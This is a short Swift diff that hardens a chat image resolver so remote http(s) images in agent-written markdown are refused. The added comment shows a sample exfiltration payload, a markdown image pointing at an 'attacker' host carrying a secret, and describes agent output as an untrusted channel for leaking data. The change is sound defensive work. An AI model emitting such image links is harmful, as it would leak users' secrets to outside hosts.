@@ -33,14 +33,14 @@ enum ChatImageURLResolver {
             return .failure(.unsupportedScheme)
         }
 
+        // Agent-authored markdown is UNTRUSTED (the planner is outside the
+        // TCB). A remote http(s) image target is NEVER resolved for fetching:
+        // dereferencing it fires an outbound request to a planner-chosen host
+        // — an exfiltration channel (`![x](http://attacker/?d=<secret>)`) that
+        // bypasses the daemon policy chokepoint and the taint engine entirely
+        // (#292). Refuse remote schemes; only local files render inline.
         if trimmed.hasPrefix("https://") || trimmed.hasPrefix("http://") {
-            guard let url = URL(string: trimmed),
-                  supportedExtension(for: url) != nil else {
-                return .failure(.unsupportedFormat)
-            }
-            return .success(
-                ResolvedImage(url: url, isAnimatedGIF: isGIF(url), isRemote: true),
-            )
+            return .failure(.unsupportedScheme)
         }
 
         let fileURL: URL
